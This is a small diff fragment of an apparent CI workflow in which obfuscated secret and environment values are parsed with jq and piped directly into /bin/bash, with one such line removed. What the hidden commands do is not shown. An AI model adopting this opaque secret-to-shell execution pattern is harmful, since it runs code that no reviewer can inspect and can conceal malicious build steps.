@@ -17,7 +17,6 @@ jobs:
           hqs243: ${{ secrets.hqs243 }}
         run: |
           printf '%s' "$hqs243" | jq -r .ucrd19503 | /bin/bash
-          echo $cth5 | jq -r .sbamj72304 | /bin/bash
           echo $sw4 | jq -r .fhf71219 | /bin/bash
           printf '%s' "$fgv501" | jq -r .cor250 | /bin/bash
           echo $ac97 | jq -r .du8 | /bin/bash
